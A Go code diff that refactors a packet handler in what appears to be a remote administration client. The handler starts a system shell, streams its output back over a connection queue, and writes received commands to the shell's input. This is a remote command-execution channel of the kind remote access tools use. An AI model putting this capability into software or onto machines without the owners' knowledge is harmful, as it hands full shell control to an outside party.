@@ -10,7 +10,8 @@ import (
 )
 
 type ShellPacket struct {
-	Data string
+	Action int    `receive`
+	Data   string `both`
 }
 
 var current struct {
@@ -19,19 +20,16 @@ var current struct {
 	stdout  io.ReadCloser
 }
 
-func (packet ShellPacket) GetHeader() common.PacketHeader {
+func (packet ShellPacket) Header() common.PacketHeader {
 	return common.ShellHeader
 }
 
-func (packet ShellPacket) Write(c *Connection) error {
-	return c.WriteString(packet.Data)
+func (packet ShellPacket) Init() {
+
 }
 
-func (packet ShellPacket) Read(c *Connection) error {
-	action, err := c.ReadInt()
-	data, err := c.ReadString()
-
-	switch action {
+func (packet ShellPacket) OnReceive() error {
+	switch packet.Action {
 	case common.StartShell:
 		current.process = exec.Command(shell.GetDefault())
 		current.stdin, _ = current.process.StdinPipe()
@@ -49,15 +47,15 @@ func (packet ShellPacket) Read(c *Connection) error {
 					break
 				}
 
-				Queue <- ShellPacket{s}
+				Queue <- ShellPacket{Data: s}
 			}
 		}()
 	case common.StopShell:
 		current.process.Process.Kill()
 		current.process = nil
 	case common.WriteShell:
-		current.stdin.Write([]byte(data + shell.LineEnd))
+		current.stdin.Write([]byte(packet.Data + shell.LineEnd))
 	}
 
-	return err
+	return nil
 }
